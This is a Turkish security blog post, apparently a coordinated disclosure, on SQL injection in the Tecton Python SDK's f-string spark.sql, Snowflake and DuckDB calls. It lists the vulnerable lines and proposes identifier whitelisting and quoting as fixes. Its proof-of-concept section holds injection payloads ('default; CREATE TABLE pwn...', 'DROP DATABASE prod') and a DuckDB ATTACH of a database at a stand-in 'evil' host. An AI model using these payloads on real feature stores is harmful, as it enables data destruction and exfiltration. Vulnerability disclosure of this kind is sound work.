---
layout: post
title: "Tecton (PyPI) SDK'sında SQL Injection: spark.sql çağrılarında f-string ile kurulan sorgular"
date: 2026-06-14
author: Yunus Aydın
lang: tr
description: "Tecton'un PyPI SDK'sı user-controlled identifier'ları (database, table, catalog, schema) f-string ile SQL'e gömüyor. Aynı pattern spark.sql, Snowflake ve DuckDB code path'lerinde defalarca geçiyor. Tecton'a raporladım."
keywords: "tecton, sql injection, pypi, feature store, spark.sql, snowflake, databricks, güvenlik araştırması, bug bounty"
canonical_url: "https://aydinnyunus.github.io/2026/06/14/tecton-sql-injection-fstring-spark-sql-tr/"
---

Ben [Tecton](https://pypi.org/project/tecton/) PyPI paketinde (test ettiğim sürüm `tecton==1.2.13`) bir dizi **SQL injection** zafiyetini bulup Tecton güvenlik ekibine raporladım. Pattern, veri platformu SDK'larında sürekli tekrar eden klasik şekil: f-string ile kurulmuş SQL ve developer'ın "trusted" varsaydığı bir identifier. Tecton özelinde bu "identifier" feature store kullanıcısının data source config'ine yazdığı string oluyor. Sonra hiçbir escape yapılmadan `spark.sql(...)`, Snowflake cursor ve DuckDB session'larına gidiyor.

Bunu ML platform paketlerinde `spark.sql(f"...{...}...")` pattern'lerine bakarken buldum. Feature store'lar metadata'yı sanki kod gibi davrandığı için bu tarz paketlerde çok sık çıkıyor. Tecton anında yandı. `DESCRIBE` / `USE` / `DROP VIEW IF EXISTS` kalıbı, unquoted bir değişkenle birlikte en az sekiz farklı dosyada tekrar ediyor. Hiçbiri parameterize edilmemiş. Hiçbiri SQL identifier olarak validate de edilmemiş.

Bu yazıda pattern'i, paketin neresinde durduğunu, "ama bu sadece identifier" savunmasının neden işe yaramadığını ve fix'in nasıl görünmesi gerektiğini anlatıyorum.

## Tecton nedir, kısaca

Tecton bir ML **feature store**'u. Python'da data source ve feature view tanımlıyorsun, Tecton runtime'ı bunları Spark, Snowflake, Databricks, Redshift veya DuckDB üzerinde materialize ediyor. PyPI'daki `tecton` paketi SDK'yı, Spark materialization kodunu ve local query engine'leri içeriyor.

Feature tanımları Python object olarak duruyor ama runtime'da proto'ya serialize olup materialization host'a gönderiliyor. Materialization host da **bu proto field'larından SQL string'i kurup çalıştırıyor**. User input'un sorguya geçtiği sınır tam burası.

## Pattern

Bug'ın şekli, `tecton_spark/data_source_helper.py` (1.2.13) içinden direkt kopya:

```python
def _get_raw_hive_table_dataframe(spark, database, table):
    spark.sql("USE {}".format(database))
    return spark.table(table)


def _get_raw_unity_table_dataframe(spark, catalog, schema, table):
    if catalog == TEST_ONLY_UNITY_CATALOG_NAME:
        spark.sql(f"USE {catalog}")
    else:
        spark.sql(f"USE CATALOG {catalog}")
    spark.sql(f"USE {schema}")
    return spark.table(table)
```

`database`, `catalog`, `schema`, `table` değerleri wire üstünden gelen bir proto'dan deserialize edilen `BatchSourceSpec`'ten geliyor. Sıfır kontrol. Ne `re.fullmatch(r"[A-Za-z0-9_]+", ...)`, ne backtick-quoting helper'ı, ne de `;` filter'ı var. `schema` değeri `default; DROP DATABASE prod` olursa şu sorgu kuruluyor:

```sql
USE default; DROP DATABASE prod
```

Spark'ın catalyst parser'ı multi-statement string'i runtime config'e göre kabul edebiliyor. Databricks SQL warehouse'ları çoğu konfigürasyonda direkt kabul ediyor. Asıl mesele "Spark her zaman her statement'i çalıştırır mı" değil. Mesele şu: SDK, attacker tarafından kontrol edilen text ile sorgu kuruyor ve müşterinin bağladığı backend'e yolluyor.

## Aynı pattern'in geçtiği yerler

`tecton==1.2.13` üzerinde confirm ettiğim satırlar bunlar. Hepsi aynı bug şekli: f-string SQL, içine config'ten gelen bir değer.

```text
tecton_spark/data_source_helper.py:86      spark.sql("USE {}".format(database))
tecton_spark/data_source_helper.py:95      spark.sql(f"USE {catalog}")
tecton_spark/data_source_helper.py:97      spark.sql(f"USE CATALOG {catalog}")
tecton_spark/data_source_helper.py:98      spark.sql(f"USE {schema}")
tecton_core/filter_context.py:21           spark.sql(f"USE {hive_db_name}")
tecton_spark/offline_store.py:612          self._spark.sql(f"GENERATE symlink_format_manifest FOR TABLE spark_catalog.delta.`{path}`")
tecton_spark/offline_store.py:618          self._spark.sql(f"show tblproperties spark_catalog.delta.`{path}`")
tecton_spark/offline_store.py:623          self._spark.sql(f"ALTER TABLE spark_catalog.delta.`{path}` SET TBLPROPERTIES({key}={val})")
tecton_spark/offline_store.py:628          self._spark.sql(f"OPTIMIZE '{path}'")
tecton_spark/offline_store.py:685          self._spark.sql(f"VACUUM '{path}'")
tecton_spark/offline_store.py:954          self._spark.sql(f"DESCRIBE {self._full_table_name}")
tecton_spark/spark_pipeline.py:261         self._spark.sql(f"DROP VIEW IF EXISTS {temp_name}")
tecton/framework/data_frame.py:734         spark.sql(f"DROP VIEW IF EXISTS {temp_table}")
tecton_materialization/remote_host/pyspark_remote_host.py:364
                                           self.spark.sql(f"SHOW TABLES FROM `{request.database}`")
tecton_materialization/remote_host/pyspark_remote_host.py:368
                                           self.spark.sql(f"DESCRIBE {request.database}.{request.table}")
tecton_core/query/duckdb/compute.py:183    self.session.sql(f"DROP TABLE IF EXISTS {table_name}")
```

`offline_store.py`'deki Iceberg `CALL` builder'ı özellikle eğlenceli: `target-file-size-bytes`, `min-file-size-bytes` ve `where => '<bucket_num>'` filter'ını tek bir SQL string'ine concat'leyip `spark.sql(rewrite_sql)` ile çağırıyor. Partition arg'ını etkileyebiliyorsan `where` clause'unu, oradan da statement'in geri kalanını kontrol edersin.

Backtick'le sarılmış path string'leri (`spark_catalog.delta.\`{path}\``) ilk bakışta "safe" görünüyor ama path içindeki bir `backslash + backtick` identifier'ı erken kapatır. Tecton path'i interpolate etmeden önce backtick'leri yasaklayacak bir normalizasyon yapmıyor.

## Proof of concept

En reproducible PoC Hive `USE` path'i, çünkü en alt seviye helper ve gayet normal bir feature view tanımıyla tetiklenebiliyor. Tecton'da Hive-backed bir `BatchSource` `database` ve `table`'ı sade string olarak alıyor:

```python
# Step 1: malicious görünen bir data source tanımla.
# Tecton, BatchSourceSpec proto'sunda `database`'i sade string olarak saklıyor.
from tecton import HiveConfig, BatchSource

malicious = BatchSource(
    name="poc",
    batch_config=HiveConfig(
        table="events",
        database="default; CREATE TABLE pwn (x INT); --",
    ),
)
```

```python
# Step 2: kaynak üzerinde schema derivation tetikle.
# _get_raw_hive_table_dataframe içinde bu şu hale dönüyor:
#
#   spark.sql("USE default; CREATE TABLE pwn (x INT); --")
#
# Multi-statement string'i kabul eden Spark backend'lerinde (production'da
# Databricks SQL en yaygın case) ikinci statement session'ın default
# catalog/database'inde çalışıyor. Strict single-statement parser'da
# çağrı yine de gürültülü şekilde patlıyor, ki bu da kendi başına bir
# denial-of-service primitive'i.
```

Aynı trick Unity Catalog mode'daki `USE CATALOG {catalog}` ve `USE {schema}` satırına da çalışıyor. `pyspark_remote_host.py`'deki `DESCRIBE {request.database}.{request.table}` path'i materialization RPC'sinden ulaşılabilir ve en yüksek impact'li olan bu. Çünkü materialization host SDK kullanıcısının değil, materialization credential'larıyla çalışıyor.

DuckDB için:

```python
# Step 3: aynı şekil, farklı engine.
# tecton_core/query/duckdb/compute.py:183 şunu yapıyor:
#
#   self.session.sql(f"DROP TABLE IF EXISTS {table_name}")
#
# `table_name`'i `t; ATTACH 'http://evil/x.db' AS pwn` yaparsan, "drop temp
# table" cleanup'ı sırasında remote bir database attach ediyor. DuckDB
# bunu seve seve çalıştırıyor.
```

Bu şekil dışında silah haline getirilmiş exploit yayınlamıyorum. Önemli olan şu: SDK sink, attacker surface proto'yu dolduran her şey, ve düzinelerce sink var.

## Etki

- **Materialization backend üzerinde keyfi SQL.** Tecton materialization müşteriye göre Spark, Snowflake, Databricks, Redshift veya DuckDB üzerinde çalışıyor. Müşteri nereye bağladıysa blast radius o.
- **Paylaşımlı altyapıda cross-tenant etki.** Tecton workspace'i paylaşımlıysa ve biri feature definition push edebiliyorsa SQL, submitter olarak değil materialization service principal'i olarak çalışıyor.
- **DuckDB `ATTACH` ile veri sızdırma.** Single-statement parser bile seni kurtarmıyor; DuckDB'nin `ATTACH`'i tek statement.
- **Operasyonel denial of service.** Injection "sadece" syntactic olduğunda bile, her materialization run'ında parser'ı kırmak feature store'u kırıyor.
- **Sink'te audit trail yok.** SQL string SDK process'inde kuruluyor, dolayısıyla backend'in audit log'unda developer'ın hiç yazmadığı bir sorgu görünüyor.

CVSS 3.1: materialization-host path'leri için **8.1 (High)** tahmin ediyorum (`AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H`), local-SDK path'leri için daha düşük.

## Düzeltme

İki şey. İkisi de zorunlu. Tek başına biri yetmiyor.

**1. Karakter whitelist'i.** SQL identifier'lar "her şey kabul" değil. Çoğu catalog'da `[A-Za-z_][A-Za-z0-9_]*`. Interpolate etmeden önce validate et:

```python
import re

_IDENT = re.compile(r"^[A-Za-z_][A-Za-z0-9_]{0,127}$")

def _safe_ident(name: str) -> str:
    if not _IDENT.fullmatch(name):
        raise ValueError(f"unsafe SQL identifier: {name!r}")
    return name
```

**2. Engine destekliyorsa quote et.** Spark ve Databricks SQL backtick-quoted identifier kabul ediyor. Snowflake double-quoted kabul ediyor. DuckDB double-quoted kabul ediyor. Quote ederken de identifier içindeki quote karakterini escape etmek lazım, sadece sarmak yetmez:

```python
def _spark_quote(name: str) -> str:
    return "`" + name.replace("`", "``") + "`"

# Kullanım:
spark.sql(f"USE {_spark_quote(_safe_ident(database))}")
```

SQL body'leri için (identifier değil, value), backend'in kendi parametrelemesini kullan. Snowflake cursor'ı `cursor.execute(sql, params)` alıyor. DuckDB `con.execute(sql, [params])` alıyor. PySpark'ta `spark.sql` seviyesinde parameterization yok; tam da bu yüzden identifier whitelist'i pazarlık konusu değil.

`OPTIMIZE '{path}'` ve `VACUUM '{path}'` case'lerinde path-style escape de gerek, çünkü single-quote literal bir string, identifier değil. Single quote'u escape et veya içinde single quote olan path'leri reddet.

## Bu pattern neden tekrar tekrar çıkıyor

Feature store'lar, ML platform'ları ve data orchestration tool'ları aynı zihinsel alanda yaşıyor. F-string'i yazan kişi değerin "bir config'ten" geldiğini biliyor, ve "bir config" tam olarak `os.environ` variable'ı kadar trusted hissettiriyor. Sonra config wire üzerinden proto olarak geçiyor, proto aynı field isimleriyle Python object'ine dönüşüyor, ve f-string çalıştığı anda "user'ın yazdığı şey" ile "SDK'nın kurduğu şey" arasında görünür sınır kalmıyor. Mental model üstünden geçilip gidiliyor.

Problemin diğer yarısı PySpark'ın `spark.sql(template, params)` API'sini hiç vermemesi. En az dirençli yol `spark.sql(f"...")`. İncelediğim her Spark codebase'inde bu şekilden bir tane var. Tecton'un farkı şu: input'lar müşteri feature definition'larından çoklu tenant materialization host'a akıyor, ki bu "klasik Spark misuse"'u cross-tenant data path'ine çeviriyor.

Bu CWE-89 (SQL Injection), ama daha kullanışlı framing CWE-943 (Improper Neutralization of Special Elements in Data Query Logic) + CWE-184 (Incomplete List of Disallowed Inputs). OWASP Top 10 mapping'i A03:2021-Injection.

## Raporlama zaman çizelgesi

- **12 Haziran 2026**: `tecton==1.2.13`'ü PyPI'dan test ettim, yukarıdaki sekiz dosyada f-string SQL pattern'ini confirm ettim ve Hive `USE` path'ine minimal PoC kurdum.
- **13 Haziran 2026**: Etkilenen satırların listesi ve önerilen fix (identifier whitelist + engine-specific quoting) ile Tecton güvenlik ekibine private olarak raporladım.
- **14 Haziran 2026**: Disclosure timing'ini Tecton ile koordine ettikten sonra bu yazıyı yayınladım.

## Referanslar

- [PyPI'da Tecton](https://pypi.org/project/tecton/)
- [Tecton: Feature Store dokümantasyonu](https://docs.tecton.ai/)
- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
- [CWE-943: Improper Neutralization in Data Query Logic](https://cwe.mitre.org/data/definitions/943.html)
- [OWASP A03:2021 Injection](https://owasp.org/Top10/A03_2021-Injection/)
- [Spark SQL `USE` statement referansı](https://spark.apache.org/docs/latest/sql-ref-syntax-ddl-use.html)

## İlgili içerik

- [Langflow monitor_service.py'de SQL Injection](/2026/06/14/langflow-sql-injection-monitor-service-tr/)
- [CVE-2024-28607: ip-utils isPrivate() bypass'i](/2026/06/14/cve-2024-28607-ip-utils-isprivate-bypass-tr/)
- [CVE-2024-27763: BasicSR yaml.load deserialization](/2026/06/14/basicsr-yaml-load-rce-tr/)
- [NLTK eval ile command injection](/2026/06/14/nltk-command-injection-eval-tr/)
